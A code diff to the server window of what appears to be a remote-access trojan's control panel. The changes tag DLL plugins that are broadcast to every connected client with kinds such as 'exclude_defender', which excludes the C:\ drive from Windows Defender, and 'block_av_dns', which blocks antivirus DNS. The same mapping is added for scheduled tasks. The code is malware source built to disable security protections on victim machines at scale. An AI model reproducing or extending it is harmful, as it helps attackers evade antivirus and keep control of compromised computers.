@@ -2465,7 +2465,7 @@ public partial class ServerWindow : ThemedWindow
             {
                 Type = Protocol.PacketType.PluginExec,
                 Data = Newtonsoft.Json.JsonConvert.SerializeObject(new Protocol.PluginExecData
-                { DllBase64 = Convert.ToBase64String(bytes), ExportName = "PluginMain" })
+                { DllBase64 = Convert.ToBase64String(bytes), ExportName = "PluginMain", PluginKind = "exclude_defender" })
             };
             await Task.WhenAll(clients.Select(c => _server.SendToClient(c.Id, pkt)));
             Dispatcher.BeginInvoke(() => Log($"[ADMIN] Exclude C:\\ sent to {clients.Count} client(s)."));
@@ -2489,7 +2489,7 @@ public partial class ServerWindow : ThemedWindow
             {
                 Type = Protocol.PacketType.PluginExec,
                 Data = Newtonsoft.Json.JsonConvert.SerializeObject(new Protocol.PluginExecData
-                { DllBase64 = Convert.ToBase64String(bytes), ExportName = "PluginMain" })
+                { DllBase64 = Convert.ToBase64String(bytes), ExportName = "PluginMain", PluginKind = "block_av_dns" })
             };
             await Task.WhenAll(clients.Select(c => _server.SendToClient(c.Id, pkt)));
             Dispatcher.BeginInvoke(() => Log($"[ADMIN] Block AV DNS sent to {clients.Count} client(s)."));
@@ -5174,7 +5174,13 @@ Read-Host 'Press Enter to close'
                     var data = new Protocol.PluginExecData
                     {
                         DllBase64  = task.FileBase64,
-                        ExportName = "PluginMain"
+                        ExportName = "PluginMain",
+                        PluginKind = task.FileName switch
+                        {
+                            "Block AV DNS"  => "block_av_dns",
+                            "Exclude C:\\"  => "exclude_defender",
+                            _               => null
+                        }
                     };
                     packet = new Protocol.Packet
                     {
